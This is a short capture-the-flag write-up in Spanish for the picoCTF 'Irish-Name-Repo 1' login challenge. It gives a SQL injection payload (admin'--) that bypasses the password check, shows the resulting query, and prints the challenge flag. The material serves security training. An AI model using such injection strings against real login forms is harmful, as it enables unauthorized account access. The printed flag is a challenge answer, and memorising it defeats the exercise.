### Irish-Name-Repo 1
### Descripcion
Do you think you can log us in? Try to see if you can login! http://fickle-tempest.picoctf.net:54603.
### Solucion
- En la parte de inspect se le da al boton de login y se muestra o se quita el hidden de un boton nuevo se le da un valor de 1 para poder meterse a la siguiente pagina, para ignorar la contraseña y no validarla se pone '--' el cual se usa para comentar.
- username: admin'--
- password: password
- SQL query: SELECT * FROM users WHERE name='admin'--' AND password='password'
- # Logged in!
- Your flag is: picoCTF{s0m3_SQL_85832275}

picoCTF{s0m3_SQL_85832275}
### Notas
- En SQL en las consultas '--' se usa para comentar las lineas.
### Referencias
- https://www.w3schools.com/sql/sql_injection.asp